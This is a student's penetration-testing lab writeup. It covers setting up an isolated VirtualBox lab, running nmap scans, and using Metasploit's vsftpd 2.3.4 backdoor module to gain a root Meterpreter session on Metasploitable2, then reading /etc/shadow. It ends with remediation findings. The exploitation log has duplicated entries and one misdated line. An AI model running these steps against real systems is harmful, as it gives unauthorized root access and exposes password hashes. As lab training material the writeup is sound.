# Project 1: Metasploitable2 Exploitation Chain

## Objective
Set up an isolated lab environment and perform a full attack chain (recon → exploitation → privilege escalation) against a deliberately vulnerable target, to build hands-on penetration testing skills and produce a portfolio-ready writeup.

## Lab Environment
- Attacker: Kali Linux 2026.2 (VirtualBox)
- Target: Metasploitable2 (Ubuntu-based)
- Network: Internal Network "pentestlab" (isolated — no host or internet access)
  - Kali: 192.168.100.20 (static)
  - Metasploitable2: 192.168.100.10 (static)
- Host specs: [fill in your PC's RAM/CPU]

## Setup Log
- [06 Sep 2026] Downloaded Kali VirtualBox image (.7z); initial extraction confusion because Windows was hiding file extensions — fixed by enabling "File name extensions" in File Explorer View tab
- [06 Sep 2026] Added Kali VM via Machine > Add, pointed to extracted .vbox file
- [06 Sep 2026] Booted Kali, logged in (kali/kali), ran `ip a` — confirmed eth0 assigned 10.0.2.15/24 NAT mode
- [06 Sep 2026] Started downloading Metasploitable2 (.zip, ~1.7GB) from SourceForge
- [06 Sep 2026] Metasploitable2 download complete, extracted .zip
- [06 Sep 2026] Created Metasploitable2 VM (Ubuntu 64-bit), attempted first boot — VM aborted with VERR_UNRESOLVED_ERROR (E_FAIL 0x80004005)
- [06 Sep 2026] Confirmed Metasploitable.vmdk correctly attached under SATA controller — ruled out disk misconfiguration as cause of boot failure
- [06 Sep 2026] Checked Windows Features — Hyper-V, Virtual Machine Platform, Hypervisor Platform, Sandbox all already unchecked. Ruled out as cause.
- [06 Sep 2026] Confirmed hardware virtualization (VT-x) enabled in Task Manager — ruled out BIOS setting as cause
- [06 Sep 2026] Reviewed VBox.log — identified root cause: Windows error 1455 (ERROR_COMMITMENT_LIMIT), page file/virtual memory too small for VM memory allocation. Not a disk or virtualization-setting issue as initially suspected.
- [06 Sep 2026] Increased Windows page file (Custom size, Initial 4096MB / Max 8192MB) and restarted — resolved VERR_UNRESOLVED_ERROR / Windows error 1455. Metasploitable2 booted successfully.
- [07 Sep 2026] Learned that NAT mode isolates each VM into its own private network — VMs can't see each other, only outbound internet. Switched both VMs to "Internal Network" mode (name: pentestlab) so they're isolated together and can communicate directly, without host/internet access.
- [07 Sep 2026] Internal Network has no DHCP server — had to assign static IPs manually on both VMs
- [07 Sep 2026] Metasploitable2: edited /etc/network/interfaces, changed 'iface eth0 inet dhcp' to static with address 192.168.100.10, netmask 255.255.255.0. Applied with `sudo /etc/init.d/networking restart`. Confirmed via ifconfig.
- [07 Sep 2026] Kali: assigned static IP via `nmcli con mod "Wired connection 1" ipv4.addresses 192.168.100.20/24 ipv4.method manual` + `nmcli con up`. Confirmed via ip a — eth0 shows 192.168.100.20/24. (Noted: ifconfig deprecated on this Kali build, used ip a instead.)
- [07 Sep 2026] Ran `ping -c 4 192.168.100.10` from Kali — 4 packets sent, 0% packet loss, rtt min/avg/max/mdev = 1.304/1.873/2.677/0.504 ms. Confirms Kali and Metasploitable2 can communicate over the isolated "pentestlab" internal network. Lab environment setup complete.

## Reconnaissance
- [07 Sep 2026] Ran `nmap -p- -T4 192.168.100.10` — full 65535-port scan completed in 46.23s
- Found 29 open ports. Notable services: FTP(21), SSH(22), Telnet(23), SMTP(25), DNS(53), HTTP(80), SMB(445), MySQL(3306), PostgreSQL(5432), VNC(5900), IRC(6667), plus unusual high ports (8180, 46924, 47615, 56160, 57562) — 8180 stands out as unusual and worth investigating.
- [Full scan output pasted/screenshotted below]

## Enumeration
- [07 Sep 2026] Ran `nmap -sV -sC -p <ports> 192.168.100.10` for service/version detection on all discovered ports
- Port 21: vsftpd 2.3.4 — KNOWN BACKDOORED VERSION (CVE-2011-2523). Also allows anonymous FTP login (FTP code 230) — separate misconfiguration finding.
- Port 22: OpenSSH 4.7p1 Debian 8ubuntu1 — outdated version, known CVEs exist
- Port 25: Postfix smtpd — SSL cert expired since 2010, SSLv2 supported (deprecated/weak protocol)
- Port 53: ISC BIND 9.4.2 — outdated DNS server version
- Port 80: Apache httpd 2.2.8 (Ubuntu) DAV/2 — to be investigated further

## Exploitation
- [07 sept 2026] Attempted `mfsconsole` — command not found (typo: letters transposed). Correct command is `msfconsole`.
- [07 Sept 2026] Launched msfconsole successfully
- [07 Sept 2016] Ran `search vsftpd` in msfconsole — identified exploit/unix/ftp/vsftpd_234_backdoor (Rank: excellent) as the module matching our target's version (vsftpd 2.3.4)
- [07 Sept 2026] Ran `search vsftpd` in msfconsole — identified exploit/unix/ftp/vsftpd_234_backdoor (Rank: excellent) as the module matching our target's version (vsftpd 2.3.4)
- [07 Sept 2026] Loaded exploit/unix/ftp/vsftpd_234_backdoor. show options revealed RHOSTS (target IP) was required and unset; RPORT already correctly defaulted to 21.
- [07 Sept 2026] Set RHOSTS to 192.168.100.10 (Metasploitable2 target)
- [07 Sept 2026] First run/exploit attempt failed: OptionValidateError — LHOST required but unset
- [07 Sept 2026] Set LHOST to 192.168.100.20 (Kali's own IP) — required for reverse_tcp payload to call back to attacker machine
## Exploitation
- [07 Sept 2026] Set RHOSTS=192.168.100.10, RPORT=21 (default)
- [07 Sept 2026] First run/exploit attempt failed: LHOST required but unset (reverse_tcp payload needs attacker IP to call back to)
- [07 Sept 2026] Set LHOST=192.168.100.20 (Kali's IP)
- [07 Sept 2026] Ran exploit — SUCCESS. Metasploit confirmed vulnerable banner, spawned backdoor, Meterpreter session 1 opened (192.168.100.20:4444 → 192.168.100.10:49037)
- [07 Sept 2026] Attempted `whoami` — failed, "Unknown command." Learned Meterpreter has its own command set distinct from standard Linux shell commands; correct equivalent is `getuid`
- [07 Sept 2026] Ran `getuid` in Meterpreter session — confirmed uid=0 (root). Full administrative access achieved directly via the vsftpd backdoor exploit, no separate privilege escalation required.
- [07 Sept 2026] Ran `sysinfo` — confirmed target OS/kernel details (see output below)
 
- [07 Sept 2026] Ran `cat /etc/shadow` — successfully read password hash file as root, proving full system compromise. 
 
## Findings & Remediation

1. CRITICAL — vsftpd 2.3.4 Backdoor (CVE-2011-2523)
   Impact: Full remote root access with no authentication required
   Remediation: Upgrade to a current, patched version of vsftpd; verify software integrity/checksums when installing from third-party or older sources

2. HIGH — Anonymous FTP login enabled
   Impact: Allows unauthenticated access to FTP service, unrelated to the backdoor itself
   Remediation: Disable anonymous FTP access; require authenticated logins only

3. MEDIUM — Outdated SSH (OpenSSH 4.7p1), outdated DNS (BIND 9.4.2)
   Impact: Older software versions carry known vulnerabilities even without an active backdoor
   Remediation: Patch/upgrade all services to current supported versions; establish a regular patch management cycle

4. LOW — Expired SSL certificate (Postfix, expired since 2010), SSLv2 supported
   Impact: Expired cert undermines trust/encryption validation; SSLv2 is a deprecated, weak protocol
   Remediation: Renew certificates before expiry, disable SSLv2 in favor of TLS 1.2+

## Lessons Learned / What I'd Do Differently

The biggest gap I noticed during this project was not fully understanding 
the logs and error outputs as they appeared — I could follow steps, but 
when something broke (like the VERR_UNRESOLVED_ERROR or the LHOST 
validation failure), I didn't yet have the confidence to read the error 
and diagnose it independently. I also noticed I'm not yet fluent in 
Meterpreter's own command set versus standard Linux shell commands, which 
caused confusion when `whoami` failed inside a Meterpreter session.

The fix is simply more reps — more labs, more broken things, more errors 
read and diagnosed independently. By the end of this project the process 
felt more familiar than it did at the start, which tells me the 
repetition is already working.
